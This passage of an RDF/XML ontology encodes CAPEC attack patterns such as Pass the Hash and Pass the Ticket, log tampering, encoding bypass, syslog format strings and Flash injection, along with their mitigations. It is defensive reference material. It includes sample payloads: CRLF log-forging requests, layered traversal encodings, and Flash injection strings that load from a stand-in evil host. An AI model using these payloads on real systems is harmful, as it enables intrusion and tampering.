          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::173::171::180::181::20::74::73::21::22::185::200::697::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application server accepts paths to locate resources.::The application server does insufficient input data validation on the resource path requested by the user.::The access right to resources are not set properly.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker can try variation of the slashes characters.:LEVEL:Low::SKILL:An attacker can use more sophisticated tool or script to scan a website and find a path filtering problem.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker201">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#645">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:560::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Use of Captured Tickets (Pass The Ticket)"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack201">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#645"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::522::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::522::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary needs physical access to the victim system.::The use of a third-party credential harvesting tool.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Determine if Kerberos authentication is used on the server.:LEVEL:Low::SKILL:The adversary uses a third-party tool to obtain the necessary tickets to execute the attack.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Hard Coded Alternate DNS server in applications Avoid dependence on DNS Include hosts file/IP address in the application Ensure best practices with respect to communications channel protections. Use a .onion domain with Tor support::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack120">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#589">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:603::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#DNS Blocking"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::300::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other Preventing DNS from resolving a request denies the availability of a target site or service for the user.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker466">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#69"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack466"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::250::264::15::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted program runs with elevated OS privileges.::The targeted program accepts input data from the user or from another program.::The targeted program does not perform input validation properly.::The targeted program does not fail safely. For instance when a program fails it may authorize restricted access to anyone.::The targeted program has a vulnerability such as buffer overflow which may be exploited if a malicious user can inject unvalidated data. For instance a buffer overflow interrupts the program as it executes  and makes it run additional code supplied by the attacker. If the program under attack has elevated privileges to the OS  the attacker can elevate its privileges (such as having root level access).::The targeted program is giving away information about itself. Before performing such attack  an eventual attacker may need to gather information about the services running on the host target. The more the host target is verbose about the services that are running (version number of application  etc.) the more information can be gather by an attacker.::This attack often requires communicating with the host target services directly. For instance Telnet may be enough to communicate with the host target.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker can use a tool to scan and automatically launch an attack against known issues. A tool can also repeat a sequence of instructions and try to brute force the service on the host target  an example of that would be the flooding technique.:LEVEL:Low::SKILL:More advanced attack may require knowledge of the protocol spoken by the host service.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker200">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#644">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:560::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Use of Captured Hashes (Pass The Hash)"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack200">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#644"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::522::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::522::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary needs to first obtain the hashed credentials of a user  via the use of a tool  prior to executing this attack.::The victim system must allow Lan Man or NT Lan Man authentication.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Determine if Lan Man and NT Lan Man authentication is allowed on the server.:LEVEL:Low::SKILL:The adversary uses a third-party tool to obtain hashed credentials to execute the attack.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker333">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#128"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack333"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::682::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must have an integer variable for which only some of the possible integer values are expected by the application and where there are no checks on the value of the variable before use.::The attacker must be able to manipulate the targeted integer variable such that normal operations result in non-standard values due to the storage structure of integers.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use input validation before writing to web log::Design: Validate all log data before it is output::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack508">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#81">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:268::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Web Logs Tampering"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::117::93::75::221::96::20::150::276::279::116::713::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine Application Web Server Log File Format) The attacker observes the system and looks for indicators of which logging utility is being used by the web server.TECHNIQUE:Determine logging utility being used by application web server (e.g. log4j)  only possible if the application is known by the attacker or if the application returns error messages with logging utility information.::STEP:2:PHASE:Experiment:DESCRIPTION:(Determine Injectable Content) The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.TECHNIQUE:Attacker triggers logged actions with maliciously crafted data as inputs  parameters  arguments  etc.::STEP:3:PHASE:Exploit:DESCRIPTION:(Manipulate Log Files) The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.TECHNIQUE:Indirectly through injection  use carriage return and/or line feed characters to start a new line in the log file  and then  add a fake entry. For example: The HTTP request for /index.html%250A%250DIP_ADDRESS- - DATE_FORMAT) GET /forged-path HTTP/1.1 200 - - USER_AGENT may add the log line into Apache access_log (for example). Different applications may require different encodings of the carriage return and line feed characters.:TECHNIQUE:Directly through log file or database manipulation  use carriage return and/or line feed characters to start a new line in the log file  and then  add a fake entry. For example: The HTTP request for /index.html%250A%250DIP_ADDRESS- - DATE_FORMAT) GET /forged-path HTTP/1.1 200 - - USER_AGENT may add the log line into Apache access_log (for example). Different applications may require different encodings of the carriage return and line feed characters.:TECHNIQUE:Directly through log file or database manipulation  modify existing log entries.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker332">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#43">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Exploiting Multiple Input Interpretation Layers"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack332">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#43"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::171::179::181::184::183::77::78::74::20::697::707::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine application/system inputs where bypassing input validation is desired) The attacker first needs to determine all of the application&apos;s/system&apos;s inputs where input validation is being performed and where he/she wants to bypass it.TECHNIQUE:While using an application/system  the attacker discovers an input where validation is stopping him/her from performing some malicious or unauthorized actions.::STEP:2:PHASE:Experiment:DESCRIPTION:(Determine which character encodings are accepted by the application/system) The attacker then needs to provide various character encodings to the application/system and determine which ones are accepted. The attacker will need to observe the application&apos;s/system&apos;s response to the encoded data to determine whether the data was interpreted properly.TECHNIQUE:Determine which escape characters are accepted by the application/system. A common escape character is the backslash character  &apos;&apos;:TECHNIQUE:Determine whether URL encoding is accepted by the application/system.:TECHNIQUE:Determine whether UTF-8 encoding is accepted by the application/system.:TECHNIQUE:Determine whether UTF-16 encoding is accepted by the application/system.:TECHNIQUE:Determine if any other encodings are accepted by the application/system.::STEP:3:PHASE:Experiment:DESCRIPTION:(Combine multiple encodings accepted by the application.) The attacker now combines encodings accepted by the application. The attacker may combine different encodings or apply the same encoding multiple times.TECHNIQUE:Combine same encoding multiple times and observe its effects. For example  if special characters are encoded with a leading backslash  then the following encoding may be accepted by the application/system: .. With two parsing layers  this may get converted to . after the first parsing layer  and then  to . after the second. If the input validation layer is between the two parsing layers  then .. might pass a test for .. but still get converted to .. afterwards. This may enable directory traversal attacks.:TECHNIQUE:Combine multiple encodings and observe the effects. For example  the attacker might encode . as .  and then  encode . as &amp;%2392;&amp;%2346;  and then  encode that using URL encoding to %2526%252392%253B%2526%252346%253B::STEP:4:PHASE:Exploit:DESCRIPTION:(Leverage ability to bypass input validation) Attacker leverages his ability to bypass input validation to gain unauthorized access to system. There are many attacks possible  and a few examples are mentioned here.TECHNIQUE:Gain access to sensitive files.:TECHNIQUE:Perform command injection.:TECHNIQUE:Perform SQL injection.:TECHNIQUE:Perform XSS attacks.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::171::179::181::184::183::77::78::74::20::697::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::User input is used to construct a command to be executed on the target system or as part of the file name.::Multiple parser passes are performed on the data supplied by the user.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Knowledge of various escaping schemes  such as URL escape encoding and XML escape characters.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure that proper access control is implemented on all systems to prevent unauthorized access to system files and processes.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack356"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker465">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#59"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack465"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::290::330::331::346::488::539::200::6::285::384::693::719::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target host uses session IDs to keep track of the users.::Session IDs are used to control access to resources.::The session IDs used by the target host are predictable. For example  the session IDs are generated using predictable information (e.g.  time).::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:There are tools to brute force session ID. Those tools require a low level of knowledge.:LEVEL:Low::SKILL:Predicting Session ID may require more computation work which uses advanced analysis such as statistical analysis.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::The code should be reviewed for misuse of the Syslog function call. Manual or automated code review can be used. The reviewer needs to ensure that all format string functions are passed a static string which cannot be controlled by the user and that the proper number of arguments are always sent to that function as well. If at all possible  do not use the %25n operator in format strings. The following code shows a correct usage of Syslog(): syslog(LOG_ERR  %25s  cmdBuf); The following code shows a vulnerable usage of Syslog(): syslog(LOG_ERR  cmdBuf); // the buffer cmdBuff is taking user supplied data.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack470">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#67">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#String Format Overflow in syslog()"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::134::74::20::680::697::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The attacker finds that he can inject data to the format string parameter of Syslog().::STEP:2:PHASE:Exploit:DESCRIPTION:The attacker craft a malicious input and inject it into the format string parameter. From now on  the attacker can execute arbitrary code and do more damage.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker206">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#545"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack206"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker339">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#392"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack339"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Ensure that terminals are only writeable by named owner user and/or administrator::Design: Enforce principle of least privilege::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack450">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#40">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:248::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Manipulating Writeable Terminal Devices"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::77::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify attacker-writable terminals) Determine if users TTYs are writable by the attacker.TECHNIQUE:Determine the permissions for the TTYs found on the system. Any that allow user write to the TTY may be vulnerable.:TECHNIQUE:Attempt to write to other user TTYs. This approach could leave a trail or alert a user.::STEP:2:PHASE:Exploit:DESCRIPTION:(Execute malicious commands) Using one or more vulnerable TTY  execute commands to achieve various impacts.TECHNIQUE:Commands that allow reading or writing end user files can be executed.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: remove sensitive information such as user name and password in the SWF file.::Implementation: use validation on both client and server side.::Implementation: remove debug information.::Implementation: use SSL when loading external data::Implementation: use crossdomain.xml file to allow the application domain to load stuff or the SWF file called by other domain.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack336">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#182">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:137::NATURE:CanAlsoBe:CAPEC ID:248::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Flash Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::20::184::697::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Find Injection Entry Points) The attacker first takes an inventory of the entry points of the application.TECHNIQUE:Spider the website for all available URLs that reference a Flash application.:TECHNIQUE:List all uninitialized global variables (such as _root.*  _global.*  _level0.*) in ActionScript  registered global variables in included files  load variables to external movies.::STEP:2:PHASE:Experiment:DESCRIPTION:(Determine the application&apos;s susceptibility to Flash injection) Determine the application&apos;s susceptibility to Flash injection. For each URL identified in the explore phase  the attacker attempts to use various techniques such as direct load asfunction  controlled evil page/host  Flash HTML injection  and DOM injection to determine whether the application is susceptible to Flash injection.TECHNIQUE:Test the page using direct load asfunction  getURL javascript:gotRoot()///d.jpg:TECHNIQUE:Test the page using controlled evil page/host  http://example.com/evil.swf:TECHNIQUE:Test the page using Flash HTML injection  &apos;&gt;&lt;img src=&apos;asfunction:getURL javascript:gotRoot()//.jpg&apos; &gt;:TECHNIQUE:Test the page using DOM injection  (gotRoot(&apos;&apos;))::STEP:3:PHASE:Exploit:DESCRIPTION:(Inject malicious content into target) Inject malicious content into target utilizing vulnerable injection vectors identified in the Experiment phase::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::User input must be sanitized according to context before reflected back to the user. The JavaScript function &apos;encodeURI&apos; is not always sufficient for sanitizing input intended for global Flash parameters. Extreme caution should be taken when saving user input in Flash cookies. In such cases the Flash file itself will need to be fixed and recompiled  changing the name of the local shared objects (Flash cookies).::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack177"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker338">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#439"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack338"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker205">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#131">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Resource Leak Exposure"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack205">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#131"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::404::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption A successful resource leak exposure attack compromises the availability of the target system&apos;s services.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::404::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must have a resource leak that the adversary can repeatedly trigger.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Encrypt all communication between the client and server.::Implementation: Use SSL  SSH  SCP.::Operation: Use ifconfig/ipconfig or other tools to detect the sniffer installed in the network.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack152">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#65">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:157::NATURE:CanPrecede:CAPEC ID:37::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Sniff Application Code"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::319::311::318::693::719::"/>
        </j.0:exploits>
        <j.0:executes>
